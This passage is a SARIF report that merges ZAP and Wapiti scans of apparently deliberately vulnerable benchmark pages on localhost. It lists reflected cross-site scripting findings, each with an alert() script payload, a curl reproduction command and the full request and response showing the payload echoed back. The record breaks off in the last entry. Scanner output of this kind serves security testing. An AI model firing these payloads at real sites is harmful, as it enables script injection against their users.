{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "results": [
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00041?BenchmarkTest00041=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00041?username=alice&password=Letm3in_&BenchmarkTest00041=%3CScRiPt%3Ealert%28%27w47m01kwn8%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w47m01kwn8')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w47m01kwn8')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00041?username=alice&password=Letm3in_&BenchmarkTest00041=%3CScRiPt%3Ealert%28%27w47m01kwn8%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00041.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00041"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00041?BenchmarkTest00041=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00041.html?BenchmarkTest00041=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00041?username=alice&password=Letm3in_&BenchmarkTest00041=%3CScRiPt%3Ealert%28%27w47m01kwn8%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:03 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w47m01kwn8')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00047?BenchmarkTest00047=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00047?username=alice&password=Letm3in_&BenchmarkTest00047=%3CScRiPt%3Ealert%28%27wb7f104gbh%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wb7f104gbh')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wb7f104gbh')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00047?username=alice&password=Letm3in_&BenchmarkTest00047=%3CScRiPt%3Ealert%28%27wb7f104gbh%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00047.html?BenchmarkTest00047=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00047"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00047?BenchmarkTest00047=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00047.html?BenchmarkTest00047=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00047?username=alice&password=Letm3in_&BenchmarkTest00047=%3CScRiPt%3Ealert%28%27wb7f104gbh%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:03 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:43 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wb7f104gbh')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00048?BenchmarkTest00048=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00048?username=alice&password=Letm3in_&BenchmarkTest00048=%3CScRiPt%3Ealert%28%27wj1zjpdv5k%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wj1zjpdv5k')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wj1zjpdv5k')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00048?username=alice&password=Letm3in_&BenchmarkTest00048=%3CScRiPt%3Ealert%28%27wj1zjpdv5k%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00048.html?BenchmarkTest00048=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00048"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00048?BenchmarkTest00048=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00048.html?BenchmarkTest00048=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00048?username=alice&password=Letm3in_&BenchmarkTest00048=%3CScRiPt%3Ealert%28%27wj1zjpdv5k%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:03 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:43 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wj1zjpdv5k')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00049?BenchmarkTest00049=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00049?username=alice&password=Letm3in_&BenchmarkTest00049=%3CScRiPt%3Ealert%28%27wkoz2girvb%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wkoz2girvb')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wkoz2girvb')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00049?username=alice&password=Letm3in_&BenchmarkTest00049=%3CScRiPt%3Ealert%28%27wkoz2girvb%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00049.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00049"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00049?BenchmarkTest00049=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00049.html?BenchmarkTest00049=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00049?username=alice&password=Letm3in_&BenchmarkTest00049=%3CScRiPt%3Ealert%28%27wkoz2girvb%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:03 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:21:43 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('wkoz2girvb')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00382?BenchmarkTest00382=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00382?username=alice&password=Letm3in_&BenchmarkTest00382=%3CScRiPt%3Ealert%28%27why2zfd5dq%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('why2zfd5dq')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('why2zfd5dq')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00382?username=alice&password=Letm3in_&BenchmarkTest00382=%3CScRiPt%3Ealert%28%27why2zfd5dq%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00382.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00382"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00382?BenchmarkTest00382=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00382.html?BenchmarkTest00382=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00382?username=alice&password=Letm3in_&BenchmarkTest00382=%3CScRiPt%3Ealert%28%27why2zfd5dq%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
